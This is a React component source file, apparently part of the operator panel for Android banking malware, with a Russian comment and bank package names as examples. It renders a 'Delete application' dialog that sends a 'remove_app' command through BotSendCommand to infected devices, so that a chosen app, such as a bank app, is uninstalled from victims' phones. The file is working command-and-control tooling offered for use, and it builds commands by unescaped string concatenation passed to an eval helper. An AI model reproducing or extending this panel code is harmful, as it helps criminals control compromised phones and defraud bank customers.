import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

//Удаление приложений  -  {"this":"~command~","deleteApplication":"com.bank.us"}
class DeleteApps extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          app: ''
        }
    }

    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    onClickDeleteApplication = (e) => {
        SettingsContext.BotSendCommand('{"cmd":"remove_app","a":"' + this.state.app + '"}');
        try_eval('$.notify("Added command [remove_app]", "info");');
        this.setState({ 
            app: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                <div class="modal fade" id="modalDeleteApp" tabindex="-1" role="dialog" aria-labelledby="modalDeleteApp" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Delete application</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.app} onChange={this.onChangeApp} placeholder="com.app.android.bank" />       </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickDeleteApplication} class="btn btn-outline-primary"  data-dismiss="modal">Delete application</button>
                            </div>
                        </div>
                    </div>
                </div>
            </React.Fragment>
        );
    }
}

export default DeleteApps;